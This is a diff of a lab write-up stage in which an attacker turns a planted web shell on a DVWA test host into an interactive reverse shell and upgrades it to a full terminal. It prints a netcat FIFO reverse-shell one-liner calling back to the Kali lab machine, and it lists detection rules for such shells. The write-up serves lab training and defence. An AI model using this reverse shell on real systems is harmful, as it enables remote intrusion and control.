@@ -7,7 +7,7 @@
 
 ## Objective
 
-Establish an interactive reverse shell connection from the compromised DVWA web host to the Kali Linux attacker machine. This transitions the attacker's foothold from one-off command execution via a web shell into a live, interactive shell session, followed by an upgrade to a fully featured pseudo-terminal (PTY) with job control and line editing.
+Turn our one-line webshell into a live, interactive reverse shell back to Kali, then upgrade it to a full terminal with arrow keys, tab completion, and Ctrl+C support.
 
 ## Commands
 
@@ -56,11 +56,10 @@ export TERM=xterm
 
 ## What happened
 
-1. **Listener Initialization:** The attacker on Kali Linux (`192.168.232.135`) verified network settings using `ip a` on interface `eth0` and initialized a Netcat listener on TCP port `4444` (`nc -lvnp 4444`) to await inbound traffic from the target.
-2. **Reverse Shell Trigger:** Leveraging the unauthenticated web shell (`shell.php`) planted in the `/hackable/uploads/` directory during Stage 05, the attacker constructed a GET request targeting `http://192.168.56.30/hackable/uploads/shell.php`. The query parameter `cmd` carried a POSIX named-pipe FIFO reverse shell payload targeting `192.168.232.135:4444`.
-3. **Connection Callback:** The DVWA server executed the payload under the web server service account (`www-data`). The Apache worker initiated an outbound TCP connection from its interface `192.168.232.161` to `192.168.232.135:4444`, attaching `/bin/sh` standard input, output, and error streams to the network socket.
-4. **Interactive Session Obtained:** The Kali Netcat listener intercepted the connection, immediately yielding a prompt as `www-data@dvwa:/var/www/html/hackable/uploads$`.
-5. **PTY Terminal Upgrade:** The raw `/bin/sh` process lacked job control, tab completion, arrow-key navigation, and signal trapping (e.g., Ctrl+C would terminate the shell). To resolve this, the attacker used Python 3 to spawn a pseudo-terminal (`pty.spawn("/bin/bash")`), suspended the background job with `Ctrl+Z`, turned off echo and raw input handling on the local terminal (`stty raw -echo; fg`), restored sane terminal defaults (`stty sane`), and set `export TERM=xterm`. This provided a robust, full-screen interactive Bash session ready for privilege escalation.
+1. **Setting up the listener:** On Kali (`192.168.232.135`), I checked my IP on `eth0` and started a Netcat listener on port 4444 (`nc -lvnp 4444`), waiting for the server to call back.
+2. **Triggering the reverse connection:** Through our webshell (`shell.php`) from Stage 05, I sent a classic POSIX named-pipe FIFO one-liner: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.232.135 4444 > /tmp/f`.
+3. **Getting the shell:** The web server executed the command as `www-data`. Immediately, an outbound TCP connection phoned home to Kali on port 4444, handing us a live prompt: `www-data@dvwa:/var/www/html/hackable/uploads$`.
+4. **Upgrading to a real terminal:** Raw Netcat shells are clumsy—pressing Ctrl+C kills the whole connection, and tab completion doesn't work. To fix this, I spawned a pseudo-terminal using Python (`pty.spawn("/bin/bash")`), backgrounded the shell with `Ctrl+Z`, set my local terminal to raw mode (`stty raw -echo; fg`), and ran `stty sane; export TERM=xterm`. Now I had a stable, interactive Bash shell ready for privilege escalation.
 
 ## Evidence
 
@@ -101,12 +100,12 @@ export TERM=xterm
 
 ## Detection opportunities
 
-- **Process Lineage Anomaly:** Web server daemons (`apache2`, `httpd`, `php-fpm`) should never spawn interactive shell binaries (`/bin/sh`, `/bin/bash`, `/bin/dash`) or network utilities (`nc`, `netcat`, `curl`, `socat`). Host-based detection agents (Wazuh, Auditd, Sysmon for Linux Event ID 1) should trigger high-severity alerts whenever `parent_process = apache2` and `child_process in (/bin/sh, /bin/bash, python3)`.
-- **Suspicious Command-Line Arguments:** Detection rules targeting invocation of named pipes (`mkfifo`), interactive flags with standard input redirection (`/bin/sh -i 2>&1`), or Python pseudo-terminal spawns (`pty.spawn`).
+- **Process Lineage Anomaly Detection:** Web server daemons (`apache2`, `httpd`, `php-fpm`) should never spawn shell binaries (`/bin/sh`, `/bin/bash`) or network tools (`nc`, `netcat`, `curl`, `socat`). Wazuh and Auditd should alert immediately when `parent_process = apache2` and `child_process in (/bin/sh, /bin/bash, python3)`.
+- **Command-Line Telemetry:** Watch for classic reverse shell one-liners: `mkfifo`, `/tmp/f`, and pipe redirections like `| /bin/sh -i 2>&1 | nc`.
 - **Outbound Network Telemetry:** Suricata or Zeek monitoring network egress from the DMZ/web tier to untrusted subnets or external addresses on non-standard egress ports (e.g., 4444/TCP).
-- **File System / Ephemeral Files:** Monitoring the creation of FIFO special files or unexpected files within `/tmp/` or `/dev/shm` created by service users.
+- **Ephemeral File Auditing:** Watch for the creation of FIFO pipes or suspicious files in `/tmp/` created by service users like `www-data`.
 
 ## Notes
 
-- **Network Interfaces:** The DVWA machine is dual-homed: `ens37` (`192.168.232.161/24`) interfaces with the management/attacker network, while `ens33` (`192.168.56.30/24`) connects to the isolated internal Active Directory lab. The callback connected directly over the management subnet.
-- **Operational Impact:** This stage represents the critical pivot from static HTTP-based request-response interaction to a continuous, bidirectional interactive command shell, enabling in-depth system enumeration.
+- **Network Interfaces:** DVWA is dual-homed: `ens37` (`192.168.232.161/24`) interfaces with the management/attacker network, while `ens33` (`192.168.56.30/24`) connects to the isolated internal Active Directory lab. The callback connected directly over the management subnet.
+- **Operational Impact:** This stage marked the transition from one-off web requests to an interactive command shell, setting up our privilege escalation to root.
